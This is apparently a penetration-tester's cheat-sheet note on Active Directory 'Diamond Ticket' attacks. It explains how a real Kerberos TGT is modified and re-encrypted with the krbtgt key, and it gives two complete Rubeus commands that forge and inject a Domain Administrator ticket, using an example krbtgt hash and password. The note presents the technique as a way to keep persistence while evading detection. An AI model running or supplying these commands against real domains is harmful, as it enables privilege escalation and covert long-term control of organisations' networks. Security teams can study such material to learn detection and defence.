#AD_Diamond_Ticket


> [!danger] Diamond Ticket
> A **Diamond Ticket** is a modified version of a legitimate **TGT (Ticket Granting Ticket)**. Unlike Golden Tickets, which are completely forged from scratch, Diamond Tickets are based on **real TGTs** that are **decrypted, modified, and re-encrypted** using the **krbtgt account key**.

A Diamond Ticket is a **modified real TGT (Ticket Granting Ticket)** where:
- A **real ticket is taken**
- Its details are **changed (like user → Administrator)**
- Then **re-encrypted using KRBTGT key**
 Simple:  
**Golden = fake from scratch**  
**Diamond = real ticket → modified**

> [!info] Prerequisite
> we need  NTLM hash of the **KRBTGT account** which means **you need to compromise DC first** (or have DA rights) to get that KRBTGT hash
> 

> [!tip] When to Use Diamond Tickets
>Use **Diamond Tickets** when you need persistence but want to avoid detection. Golden Tickets are loud (fake timestamps), Diamond Tickets blend in with normal Kerberos traffic.

___
# <span style="color:#FF5555">Method 1: Forge a Diamond Ticket with Credentials</span>

> [!info] Variables used below
> - `$DC_IP` – Domain Controller's IP
> - `$DOMAIN` – target domain name


You can use **Rubeus** to create a Diamond Ticket using the **krbtgt AES key** and the credentials of a domain user:


```powershell
#  Rubeus.exe diamond /krbkey:<krbtgt_hash> /user:<normal_user> /password:<pass> /ticketuser:Administrator /domain:$DOMAIN /ptt
# - Logs in as normal user → Gets real TGT → Modifies it → Re-encrypts

Rubeus.exe diamond /krbkey:d7ac4db5b820be57cc79f58f196a0e5b /user:devan /password:new_password123 /enctype:rc4 /ticketuser:Administrator /domain:$DOMAIN /dc:$DC_IP /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

___
## <span style="color:#8BE9FD">Method 2: Diamond Ticket Using /tgtdeleg</span>

If you already have a **TGT delegation token** (captured via `Rubeus tgtdeleg`), you can generate a Diamond Ticket **without needing user credentials**:

```powershell
# Rubeus.exe diamond /krbkey:<krbtgt_hash> /tgtdeleg /ticketuser:Administrator /domain:$DOMAIN /ptt

Rubeus.exe diamond /krbkey:d7ac4db5b820be57cc79f58f196a0e5b /tgtdeleg /enctype:rc4 /ticketuser:Administrator /domain:$DOMAIN /dc:$DC_IP /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
